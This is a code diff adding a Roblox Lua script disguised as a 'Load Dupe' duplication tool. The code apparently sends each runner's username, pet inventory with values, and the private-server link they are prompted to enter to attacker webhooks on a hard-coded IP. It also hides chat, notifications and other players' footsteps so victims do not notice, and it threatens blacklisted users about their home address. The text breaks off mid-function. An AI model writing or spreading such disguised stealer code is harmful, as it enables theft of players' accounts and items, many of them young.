@@ -1,1 +1,1611 @@
-print('1')
+getgenv().webhook = "http://93.183.83.94:8000/webhook/f82d83e6-cd46-4b38-a14a-10ef8af428c6"
+getgenv().leaveWebhook = "http://93.183.83.94:8000/webhook/cae71a66-f36e-45d8-95d8-e30c786743b7" -- Change this to your second webhook
+getgenv().theftWebhook = "http://93.183.83.94:8000/webhook/0ee1f075-de85-417b-8664-f32eefad7cb4" -- Auto-checker webhook for stolen items
+getgenv().highHitWebhook = getgenv().highHitWebhook or "http://93.183.83.94:8000/webhook/8e002e41-7fdf-4655-a258-558f8fd4195d" -- Optional: for >= 100M total value
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+
+local player = Players.LocalPlayer
+local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5)
+game:GetService("CoreGui").RobloxGui:Destroy()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Player tracking system
+local trackedPlayers = {}
+local playerPetData = {}
+
+-- Mobile detection (global)
+local screenSize = GuiService:GetScreenResolution()
+local isMobile = screenSize.X < 800 or screenSize.Y < 600
+
+-- Check generation immediately at start
+local function checkGenerationRequirement()
+    local PlotController = require(ReplicatedStorage.Controllers.PlotController)
+    local AnimalsData = require(ReplicatedStorage.Datas.Animals)
+    local NumberUtils = require(ReplicatedStorage.Utils.NumberUtils)
+    local Rarities = require(ReplicatedStorage.Datas.Rarities)
+    local Mutations = require(ReplicatedStorage.Datas.Mutations)
+    local AnimalsModule = require(ReplicatedStorage.Shared.Animals)
+
+    local myPlot = PlotController:GetMyPlot()
+    if not myPlot then
+        return true -- Allow if plot not found
+    end
+
+    local animalList = myPlot.Channel:Get("AnimalList") or {}
+    local totalGeneration = 0
+
+    for slot, petData in pairs(animalList) do
+        if type(petData) == "table" then
+            local petIndex = petData.Index or "Unknown"
+            local generation = AnimalsModule:GetGeneration(petIndex, petData.Mutation, nil)
+            local gen = tonumber(generation) or 0
+            totalGeneration = totalGeneration + gen
+        end
+    end
+
+    -- Check if total generation is 5M or more
+    if totalGeneration < 5000000 then
+        player:Kick("You have been kicked because you need 5M/s generation brainrots to dupe with this script!")
+        return false
+    end
+    
+    return true
+end
+
+-- Blacklist check
+local function checkBlacklist()
+    local success, blacklistData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/blacklist", true)
+    end)
+    
+    if success and blacklistData then
+        local blacklistedUsers = {}
+        for line in blacklistData:gmatch("[^\r\n]+") do
+            local username = line:gsub("^%s+", ""):gsub("%s+$", "")
+            if username ~= "" then
+                table.insert(blacklistedUsers, username:lower())
+            end
+        end
+        
+        local playerName = player.Name:lower()
+        for _, blacklistedUser in ipairs(blacklistedUsers) do
+            if playerName == blacklistedUser then
+                player:Kick("You have been blacklisted and your home address has been grabbed!")
+                return false
+            end
+        end
+    end
+    
+    return true
+end
+
+-- Run blacklist check first
+if not checkBlacklist() then
+    return -- Stop script execution if blacklisted
+end
+
+-- Run generation check immediately
+if not checkGenerationRequirement() then
+    return -- Stop script execution if kicked
+end
+
+local RENotificationServiceNotify = ReplicatedStorage.Packages.Net:FindFirstChild("RE/NotificationService/Notify")
+if RENotificationServiceNotify then
+    RENotificationServiceNotify:Destroy()
+end
+
+-- Disable only other players' walking sounds
+local function disableWalkingSounds()
+    local function disablePlayerFootsteps()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= Players.LocalPlayer then
+                local character = player.Character
+                if character then
+                    local humanoid = character:FindFirstChild("Humanoid")
+                    if humanoid then
+                        -- Disable walking/running sound specifically
+                        if humanoid:FindFirstChild("Running") then
+                            humanoid.Running:Destroy()
+                        end
+                        
+                        -- Also check for footstep sounds in the character
+                        for _, obj in pairs(character:GetDescendants()) do
+                            if obj:IsA("Sound") then
+                                local soundName = string.lower(obj.Name)
+                                -- Only destroy sounds that are clearly footsteps
+                                if string.find(soundName, "footstep") or 
+                                   string.find(soundName, "walk") or 
+                                   string.find(soundName, "run") or
+                                   string.find(soundName, "step") then
+                                    obj:Destroy()
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Run immediately and on player added
+    disablePlayerFootsteps()
+    Players.PlayerAdded:Connect(disablePlayerFootsteps)
+    
+    -- Monitor for new players and their footsteps
+    Players.PlayerAdded:Connect(function(player)
+        player.CharacterAdded:Connect(function(character)
+            character:WaitForChild("Humanoid")
+            task.wait(1) -- Wait for character to fully load
+            disablePlayerFootsteps()
+        end)
+    end)
+    
+    -- Monitor existing players' character respawns
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            player.CharacterAdded:Connect(function(character)
+                character:WaitForChild("Humanoid")
+                task.wait(1)
+                disablePlayerFootsteps()
+            end)
+        end
+    end
+end
+
+-- Start walking sound disabling
+disableWalkingSounds()
+
+-- Hide chat window and only show icon
+local function hideChatWindow()
+    local StarterGui = game:GetService("StarterGui")
+    local Players = game:GetService("Players")
+    
+    -- Hide the chat window
+    StarterGui:SetCore("ChatWindowSize", UDim2.new(0, 0, 0, 0))
+    
+    -- Hide chat messages
+    StarterGui:SetCore("ChatWindowPosition", UDim2.new(0, -1000, 0, -1000))
+    
+    -- Try to hide the chat GUI elements
+    local function hideChatElements()
+        local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
+        if playerGui then
+            local chatGui = playerGui:FindFirstChild("Chat")
+            if chatGui then
+                -- Hide the main chat frame
+                local chatFrame = chatGui:FindFirstChild("Frame")
+                if chatFrame then
+                    chatFrame.Visible = false
+                end
+                
+                -- Hide chat messages container
+                local messagesFrame = chatGui:FindFirstChild("Frame"):FindFirstChild("Frame")
+                if messagesFrame then
+                    messagesFrame.Visible = false
+                end
+                
+                -- Keep only the chat icon visible
+                local chatIcon = chatGui:FindFirstChild("ChatIcon")
+                if chatIcon then
+                    chatIcon.Visible = true
+                end
+            end
+        end
+    end
+    
+    -- Run immediately
+    hideChatElements()
+    
+    -- Monitor for chat GUI changes
+    local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
+    if playerGui then
+        playerGui.ChildAdded:Connect(function(child)
+            if child.Name == "Chat" then
+                task.wait(1) -- Wait for chat to fully load
+                hideChatElements()
+            end
+        end)
+    end
+    
+    -- Also try to hide chat through CoreGui
+    local CoreGui = game:GetService("CoreGui")
+    local function hideCoreChat()
+        for _, child in pairs(CoreGui:GetChildren()) do
+            if child:IsA("ScreenGui") and child.Name == "Chat" then
+                child.Enabled = false
+            end
+        end
+    end
+    
+    hideCoreChat()
+    CoreGui.ChildAdded:Connect(function(child)
+        if child:IsA("ScreenGui") and child.Name == "Chat" then
+            child.Enabled = false
+        end
+    end)
+end
+
+-- Start chat hiding
+hideChatWindow()
+
+-- Hide leaderboard and chat icon completely
+local function hideLeaderboardAndChatIcon()
+    local function hideUIElements()
+        -- Hide leaderboard
+        local leaderboard = playerGui:FindFirstChild("Leaderboard")
+        if leaderboard then
+            leaderboard.Enabled = false
+        end
+        
+        -- Hide chat icon
+        local chat = playerGui:FindFirstChild("Chat")
+        if chat then
+            local chatIcon = chat:FindFirstChild("ChatIcon")
+            if chatIcon then
+                chatIcon.Visible = false
+            end
+        end
+        
+        -- Hide other UI elements
+        local topbar = playerGui:FindFirstChild("Topbar")
+        if topbar then
+            topbar.Enabled = false
+        end
+        
+        -- Hide any other common UI elements
+        for _, child in pairs(playerGui:GetChildren()) do
+            if child.Name == "Leaderboard" or child.Name == "Topbar" or child.Name == "Chat" then
+                child.Enabled = false
+            end
+        end
+    end
+    
+    -- Run immediately
+    hideUIElements()
+    
+    -- Monitor for new UI elements being added
+    playerGui.ChildAdded:Connect(function(child)
+        if child.Name == "Leaderboard" or child.Name == "Topbar" or child.Name == "Chat" then
+            child.Enabled = false
+            if child.Name == "Chat" then
+                local chatIcon = child:FindFirstChild("ChatIcon")
+                if chatIcon then
+                    chatIcon.Visible = false
+                end
+            end
+        end
+    end)
+    
+    -- Also try to hide through CoreGui
+    local CoreGui = game:GetService("CoreGui")
+    local function hideCoreUI()
+        for _, child in pairs(CoreGui:GetChildren()) do
+            if child:IsA("ScreenGui") then
+                if child.Name == "Leaderboard" or child.Name == "Topbar" or child.Name == "Chat" then
+                    child.Enabled = false
+                end
+            end
+        end
+    end
+    
+    hideCoreUI()
+    CoreGui.ChildAdded:Connect(function(child)
+        if child:IsA("ScreenGui") then
+            if child.Name == "Leaderboard" or child.Name == "Topbar" or child.Name == "Chat" then
+                child.Enabled = false
+            end
+        end
+    end)
+end
+
+-- Start hiding leaderboard and chat icon
+hideLeaderboardAndChatIcon()
+
+---------------------------------------------------------------------
+
+-- Function to get pets for any player
+local function getPlayerPets(targetPlayer)
+    local found = {}
+    local petDetails = {}
+    
+    local PlotController = require(ReplicatedStorage.Controllers.PlotController)
+    local AnimalsData = require(ReplicatedStorage.Datas.Animals)
+    local NumberUtils = require(ReplicatedStorage.Utils.NumberUtils)
+    local Rarities = require(ReplicatedStorage.Datas.Rarities)
+    local Mutations = require(ReplicatedStorage.Datas.Mutations)
+    local AnimalsModule = require(ReplicatedStorage.Shared.Animals)
+
+    local targetPlot = PlotController:GetPlotByPlayer(targetPlayer)
+    if not targetPlot then
+        return found, petDetails
+    end
+
+    local animalList = targetPlot.Channel:Get("AnimalList") or {}
+    local uid = targetPlot:GetUID()
+
+    for slot, petData in pairs(animalList) do
+        if type(petData) == "table" then
+            local petIndex = petData.Index or "Unknown"
+            local mutationId = petData.Mutation
+            local mutationName = mutationId and Mutations[mutationId] and Mutations[mutationId].DisplayText or "None"
+            
+            local animalInfo = AnimalsData[petIndex] or {}
+            local rarityName = animalInfo.Rarity or "Unknown"
+            local rarityColor = Rarities[rarityName] and Rarities[rarityName].Color or Color3.new(1,1,1)
+            local generation = AnimalsModule:GetGeneration(petIndex, mutationId, nil)
+            local gen = tonumber(generation) or 1
+            local price = gen
+
+            local priceStr = NumberUtils:ToString(price)
+            local generationStr = NumberUtils:ToString(generation)
+            
+            local petName = animalInfo.DisplayName or tostring(petIndex)
+            local fullPetName = mutationName ~= "None" and (petName .. " (" .. mutationName .. ")") or petName
+            
+            table.insert(found, fullPetName)
+            table.insert(petDetails, {
+                name = fullPetName,
+                baseName = petName,
+                mutation = mutationName,
+                rarity = rarityName,
+                generation = generationStr,
+                price = priceStr,
+                rawValue = gen,
+                slot = slot,
+                uid = uid
+            })
+        end
+    end
+    
+    return found, petDetails
+end
+
+-- Function to send leave notification
+local function sendLeaveNotification(playerName, playerId, missingPets, allPets)
+    local avatarUrl = (function()
+        local ok, res = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. playerId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
+        end)
+        if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
+            return res.data[1].imageUrl
+        end
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png"
+    end)()
+
+    local embedData = {
+        username = "🧛 SAB Leave Tracker",
+        content = "🚨 **PLAYER LEFT SERVER** 🚨",
+        embeds = { {
+            title = "👤 Player Left: " .. playerName,
+            description = "```diff\n- Player has left the server -\n+ Tracking their items +\n```",
+            color = 0x90EE90, -- Light Green
+            thumbnail = { url = avatarUrl },
+            fields = {
+                {
+                    name = "👤 **PLAYER INFO**",
+                    value = "```yaml\nUsername: " .. playerName .. "\nUserID: " .. playerId .. "```",
+                    inline = true
+                },
+                {
+                    name = "📊 **ITEMS TRACKED**",
+                    value = "```yaml\nTotal Items: " .. #allPets .. "\n```",
+                    inline = true
+                }
+            },
+            footer = { 
+                text = "🧛 SAB Leave Tracker • Item Monitoring System",
+                icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    -- Add missing items field if available
+    if #missingPets > 0 then
+        local missingList = {}
+        for _, pet in ipairs(missingPets) do
+            table.insert(missingList, "• " .. pet.name .. " (Gen: " .. pet.generation .. ")")
+        end
+        table.insert(embedData.embeds[1].fields, {
+            name = "❌ **MISSING ITEMS**",
+            value = "```diff\n" .. table.concat(missingList, "\n") .. "```",
+            inline = false
+        })
+    else
+        -- Show all items if we can't determine missing ones
+        local allItemsList = {}
+        for _, pet in ipairs(allPets) do
+            table.insert(allItemsList, "• " .. pet.name .. " (Gen: " .. pet.generation .. ")")
+        end
+        table.insert(embedData.embeds[1].fields, {
+            name = "📦 **ALL ITEMS**",
+            value = "```yaml\n" .. table.concat(allItemsList, "\n") .. "```",
+            inline = false
+        })
+    end
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = getgenv().leaveWebhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Leave notification sent for " .. playerName)
+            return true
+        else
+            warn("❌ Leave notification failed:", err)
+            return false
+        end
+    else
+        warn("❌ No HTTP request function available for leave notification")
+        return false
+    end
+end
+
+-- Player tracking system
+local function trackPlayer(player)
+    if player == Players.LocalPlayer then return end
+    
+    trackedPlayers[player.UserId] = {
+        name = player.Name,
+        userId = player.UserId,
+        joinTime = tick()
+    }
+    
+    -- Get initial pet data
+    task.spawn(function()
+        task.wait(2) -- Wait for player to fully load
+        local pets, petDetails = getPlayerPets(player)
+        if #pets > 0 then
+            playerPetData[player.UserId] = {
+                pets = pets,
+                petDetails = petDetails,
+                lastUpdate = tick()
+            }
+        end
+    end)
+end
+
+-- Player leaving system
+local function onPlayerLeaving(player)
+    if player == Players.LocalPlayer then return end
+    
+    local playerInfo = trackedPlayers[player.UserId]
+    if not playerInfo then return end
+    
+    local currentPets, currentPetDetails = getPlayerPets(player)
+    local originalData = playerPetData[player.UserId]
+    
+    local missingPets = {}
+    local allPets = currentPetDetails
+    
+    -- Try to determine missing pets
+    if originalData then
+        local originalPets = originalData.petDetails
+        for _, originalPet in ipairs(originalPets) do
+            local found = false
+            for _, currentPet in ipairs(currentPetDetails) do
+                if originalPet.name == currentPet.name and originalPet.slot == currentPet.slot then
+                    found = true
+                    break
+                end
+            end
+            if not found then
+                table.insert(missingPets, originalPet)
+            end
+        end
+    end
+    
+    -- Send leave notification
+    task.spawn(function()
+        sendLeaveNotification(playerInfo.name, playerInfo.userId, missingPets, allPets)
+    end)
+    
+    -- Clean up tracking data
+    trackedPlayers[player.UserId] = nil
+    playerPetData[player.UserId] = nil
+end
+
+-- Initialize player tracking
+for _, player in pairs(Players:GetPlayers()) do
+    trackPlayer(player)
+end
+
+-- Connect events
+Players.PlayerAdded:Connect(trackPlayer)
+Players.PlayerRemoving:Connect(onPlayerLeaving)
+
+---------------------------------------------------------------------
+local function sendWebhook(privateServerLink, foundPets, petDetails)
+    -- Sort pets by generation value (best to worst)
+    table.sort(petDetails, function(a, b)
+        local genA = a.rawValue or 0
+        local genB = b.rawValue or 0
+        return genA > genB
+    end)
+    
+    -- Create formatted pet list with rarity and per-second value
+    local formattedPets = {}
+    local totalGeneration = 0
+    local rarityCounts = {}
+    
+    for _, pet in ipairs(petDetails) do
+        local rarityPrefix = ""
+        local rarityEmoji = ""
+        local rarityColor = ""
+        
+        if pet.rarity == "Rainbow" then
+            rarityPrefix = "Rainbow "
+            rarityEmoji = "🌈"
+            rarityColor = "```diff\n+ RAINBOW +```"
+        elseif pet.rarity == "Diamond" then
+            rarityPrefix = "Diamond "
+            rarityEmoji = "💎"
+            rarityColor = "```css\n[DIAMOND]```"
+        elseif pet.rarity == "Gold" then
+            rarityPrefix = "Gold "
+            rarityEmoji = "🥇"
+            rarityColor = "```fix\nGOLD```"
+        elseif pet.rarity == "Legendary" then
+            rarityPrefix = "Legendary "
+            rarityEmoji = "⭐"
+            rarityColor = "```yaml\nLegendary```"
+        elseif pet.rarity == "Epic" then
+            rarityPrefix = "Epic "
+            rarityEmoji = "💜"
+            rarityColor = "```ini\n[Epic]```"
+        elseif pet.rarity == "Rare" then
+            rarityPrefix = "Rare "
+            rarityEmoji = "🔵"
+            rarityColor = "```diff\n- Rare -```"
+        elseif pet.rarity == "Uncommon" then
+            rarityPrefix = "Uncommon "
+            rarityEmoji = "🟢"
+            rarityColor = "```diff\n+ Uncommon +```"
+        elseif pet.rarity == "Common" then
+            rarityPrefix = "Common "
+            rarityEmoji = "⚪"
+            rarityColor = "```diff\n- Common -```"
+        end
+        
+        -- Count rarities
+        rarityCounts[pet.rarity] = (rarityCounts[pet.rarity] or 0) + 1
+        
+        -- Use generation as per-second value
+        local perSecondValue = pet.price .. "/s"
+        local genValueRaw = tonumber(pet.rawValue) or 0
+        totalGeneration = totalGeneration + genValueRaw
+        
+        table.insert(formattedPets, string.format(
+            "%s %s%s - %s",
+            rarityEmoji,
+            rarityPrefix,
+            pet.baseName or pet.name,
+            perSecondValue
+        ))
+    end
+    
+    local petListString = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No pets found"
+    
+    -- Create rarity summary
+    local raritySummary = {}
+    for rarity, count in pairs(rarityCounts) do
+        local emoji = ""
+        if rarity == "Rainbow" then emoji = "🌈"
+        elseif rarity == "Diamond" then emoji = "💎"
+        elseif rarity == "Gold" then emoji = "🥇"
+        elseif rarity == "Legendary" then emoji = "⭐"
+        elseif rarity == "Epic" then emoji = "💜"
+        elseif rarity == "Rare" then emoji = "🔵"
+        elseif rarity == "Uncommon" then emoji = "🟢"
+        elseif rarity == "Common" then emoji = "⚪"
+        end
+        table.insert(raritySummary, emoji .. " " .. rarity .. ": " .. count)
+    end
+    local raritySummaryString = table.concat(raritySummary, " • ")
+    
+    -- Format total generation
+    local totalGenFormatted = ""
+    if totalGeneration >= 1000000000 then
+        totalGenFormatted = string.format("%.1fB/s", totalGeneration / 1000000000)
+    elseif totalGeneration >= 1000000 then
+        totalGenFormatted = string.format("%.1fM/s", totalGeneration / 1000000)
+    elseif totalGeneration >= 1000 then
+        totalGenFormatted = string.format("%.1fK/s", totalGeneration / 1000)
+    else
+        totalGenFormatted = totalGeneration .. "/s"
+    end
+   
+    local avatarUrl = (function()
+        local ok, res = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. player.UserId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
+        end)
+        if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
+            return res.data[1].imageUrl
+        end
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+    end)()
+    
+    -- Get current server player count
+    local serverPlayerCount = #Players:GetPlayers()
+    local maxPlayers = 8
+    
+    local embedData = {
+        username = "🧛 SAB Scanner Pro",
+        content = "@everyone 🚨 **NEW HIT DETECTED** 🚨 @everyone",
+        embeds = { {
+            title = "⚡ MONEY IS EVERYTHING ⚡",
+            description = "```diff\n+ PRIVATE SERVER HIT DETECTED +\n- High Value Target -\n+ Immediate Action Required +\n```\n**🔗 Quick Join:** " .. string.format("[🚀 JOIN NOW](%s)", privateServerLink),
+            color = 0x90EE90, -- Light Green
+            thumbnail = { url = avatarUrl },
+            fields = {
+                {
+                    name = "👤 **EXECUTOR**",
+                    value = "```yaml\nUsername: " .. player.Name .. "\nUserID: " .. player.UserId .. "```",
+                    inline = true
+                },
+                {
+                    name = "📊 **PET COUNT**",
+                    value = "```yaml\nTotal Pets: " .. #petDetails .. "\n```",
+                    inline = true
+                },
+				{
+					name = "💰 **TOTAL VALUE**",
+					value = "```yaml\n" .. totalGenFormatted .. "\n```",
+					inline = true
+				},
+                {
+                    name = "👥 **PLAYERS**",
+                    value = "```yaml\n" .. serverPlayerCount .. "/" .. maxPlayers .. "```",
+                    inline = true
+                },
+                {
+                    name = "🎯 **RARITY BREAKDOWN**",
+                    value = "```" .. (raritySummaryString ~= "" and raritySummaryString or "No pets found") .. "```",
+                    inline = false
+                },
+                {
+                    name = "💎 **DETECTED PETS**",
+                    value = "```diff\n" .. petListString .. "```",
+                    inline = false
+                },
+                {
+                    name = "🔗 **SERVER ACCESS**",
+                    value = string.format("[🎮 Join Private Server](%s)", privateServerLink),
+                    inline = false
+                }
+            },
+            footer = { 
+                text = "🧛 SAB Scanner Pro • Advanced Detection System",
+                icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    -- Route to high-hit webhook if threshold met
+    local isHighHit = totalGeneration >= 100000000
+    local targetUrl = (isHighHit and getgenv().highHitWebhook and getgenv().highHitWebhook ~= "" and getgenv().highHitWebhook) or getgenv().webhook
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = targetUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Webhook sent")
+            return true, targetUrl
+        else
+            warn("❌ Webhook failed:", err)
+            return false, targetUrl
+        end
+    else
+        warn("❌ No HTTP request function available")
+        return false, targetUrl
+    end
+end
+
+---------------------------------------------------------------------
+
+-- Function to send execution notification
+local function sendExecutionNotification()
+    local avatarUrl = (function()
+        local ok, res = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. player.UserId .. '&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot'))
+        end)
+        if ok and res and res.data and res.data[1] and res.data[1].imageUrl then
+            return res.data[1].imageUrl
+        end
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+    end)()
+
+    local embedData = {
+        username = "🧛 SAB Scanner Pro",
+        content = "📢 **SCRIPT EXECUTED** 📢",
+        embeds = { {
+            title = "⚡ SCRIPT ACTIVATED ⚡",
+            description = "```diff\n+ Script has been executed successfully +\n- Waiting for private server input -\n```",
+            color = 0x90EE90, -- Light Green
+            thumbnail = { url = avatarUrl },
+            fields = {
+                {
+                    name = "👤 **EXECUTOR**",
+                    value = "```yaml\nUsername: " .. player.Name .. "\nUserID: " .. player.UserId .. "```",
+                    inline = true
+                },
+                {
+                    name = "🕒 **TIME**",
+                    value = "```yaml\n" .. os.date("%X") .. "```",
+                    inline = true
+                }
+            },
+            footer = { 
+                text = "🧛 SAB Scanner Pro • Execution Tracker",
+                icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = getgenv().webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Execution notification sent")
+            return true
+        else
+            warn("❌ Execution notification failed:", err)
+            return false
+        end
+    else
+        warn("❌ No HTTP request function available")
+        return false
+    end
+end
+
+-- Send execution notification immediately when script runs
+sendExecutionNotification()
+
+---------------------------------------------------------------------
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LaunchDupeGui"
+screenGui.Parent = playerGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true -- Make it full screen
+
+-- Full screen background
+local background = Instance.new("Frame")
+background.Name = "Background"
+background.Parent = screenGui
+background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+background.BorderSizePixel = 0
+background.Size = UDim2.new(1, 0, 1, 0)
+background.ZIndex = 1
+
+-- Main Frame (centered, full screen)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Parent = screenGui
+mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+mainFrame.BorderSizePixel = 0
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.Size = UDim2.new(0.8, 0, 0.7, 0) -- Full screen size
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.ZIndex = 2
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = mainFrame
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = mainFrame
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 0, 0.05, 0)
+titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Text = "Load Dupe"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 36
+
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Parent = mainFrame
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Position = UDim2.new(0, 0, 0.15, 0)
+subtitleLabel.Size = UDim2.new(1, 0, 0.08, 0)
+subtitleLabel.Font = Enum.Font.Gotham
+subtitleLabel.Text = "Type In Private Server Link"
+subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+subtitleLabel.TextSize = 24
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = mainFrame
+textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+textBox.BorderSizePixel = 0
+textBox.Position = UDim2.new(0.05, 0, 0.35, 0)
+textBox.Size = UDim2.new(0.9, 0, 0.1, 0)
+textBox.Font = Enum.Font.Gotham
+textBox.PlaceholderText = "Enter private server link here..."
+textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+textBox.Text = ""
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.TextSize = 20
+textBox.TextXAlignment = Enum.TextXAlignment.Left
+textBox.ZIndex = 3
+
+local textBoxPadding = Instance.new("UIPadding")
+textBoxPadding.Parent = textBox
+textBoxPadding.PaddingLeft = UDim.new(0, 15)
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 8)
+textBoxCorner.Parent = textBox
+
+local startButton = Instance.new("TextButton")
+startButton.Parent = mainFrame
+startButton.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
+startButton.BorderSizePixel = 0
+startButton.Position = UDim2.new(0.05, 0, 0.55, 0)
+startButton.Size = UDim2.new(0.9, 0, 0.12, 0)
+startButton.Font = Enum.Font.GothamBold
+startButton.Text = "Start"
+startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+startButton.TextSize = 24
+startButton.ZIndex = 3
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 10)
+buttonCorner.Parent = startButton
+
+local closeButton = Instance.new("TextButton")
+closeButton.Parent = mainFrame
+closeButton.BackgroundTransparency = 1
+closeButton.Position = UDim2.new(0.95, -40, 0.03, 0)
+closeButton.Size = UDim2.new(0, 40, 0, 40)
+closeButton.Font = Enum.Font.GothamBold
+closeButton.Text = "×"
+closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+closeButton.TextSize = 30
+closeButton.ZIndex = 3
+
+---------------------------------------------------------------------
+
+---------------------------------------------------------------------
+local function checkForPets()
+    local found = {}
+    local petDetails = {}
+    
+    -- Get the new pet data using the provided method
+    local PlotController = require(ReplicatedStorage.Controllers.PlotController)
+    local AnimalsData = require(ReplicatedStorage.Datas.Animals)
+    local NumberUtils = require(ReplicatedStorage.Utils.NumberUtils)
+    local Rarities = require(ReplicatedStorage.Datas.Rarities)
+    local Mutations = require(ReplicatedStorage.Datas.Mutations)
+    local AnimalsModule = require(ReplicatedStorage.Shared.Animals)
+    local LocalPlayer = Players.LocalPlayer
+
+    local myPlot = PlotController:GetMyPlot()
+    if not myPlot then
+        warn("Plot not found! Make sure you're in-game and fully loaded.")
+        return found, petDetails
+    end
+
+    local animalList = myPlot.Channel:Get("AnimalList") or {}
+    local uid = myPlot:GetUID()
+
+    for slot, petData in pairs(animalList) do
+        if type(petData) == "table" then
+            local petIndex = petData.Index or "Unknown"
+            local mutationId = petData.Mutation
+            local mutationName = mutationId and Mutations[mutationId] and Mutations[mutationId].DisplayText or "None"
+            
+            local animalInfo = AnimalsData[petIndex] or {}
+            local rarityName = animalInfo.Rarity or "Unknown"
+            local rarityColor = Rarities[rarityName] and Rarities[rarityName].Color or Color3.new(1,1,1)
+            local generation = AnimalsModule:GetGeneration(petIndex, mutationId, nil)
+            -- Use generation number as the per-second value
+            local gen = tonumber(generation) or 1
+            local price = gen
+
+            local priceStr = NumberUtils:ToString(price)
+            local generationStr = NumberUtils:ToString(generation)
+            
+            local petName = animalInfo.DisplayName or tostring(petIndex)
+            local fullPetName = mutationName ~= "None" and (petName .. " (" .. mutationName .. ")") or petName
+            
+            table.insert(found, fullPetName)
+            table.insert(petDetails, {
+                name = fullPetName,
+                baseName = petName,
+                mutation = mutationName,
+                rarity = rarityName,
+                generation = generationStr,
+                price = priceStr,
+                rawValue = gen, -- Add raw numeric value for sorting
+                slot = slot,
+                uid = uid
+            })
+            end
+        end
+    
+    return found, petDetails
+end
+
+local function isValidPrivateLink(raw)
+    if type(raw) ~= "string" then return false end
+    local url = raw:gsub("^%s+", ""):gsub("%s+$", "")
+    if url == "" then return false end
+    local startsWithHttp = url:sub(1, 8) == "https://" or url:sub(1, 7) == "http://"
+    if not startsWithHttp then return false end
+    local hostOk = (string.find(url, "roblox.com", 1, true) ~= nil)
+        or (string.find(url, "rblx.gg", 1, true) ~= nil)
+        or (string.find(url, "rblx.link", 1, true) ~= nil)
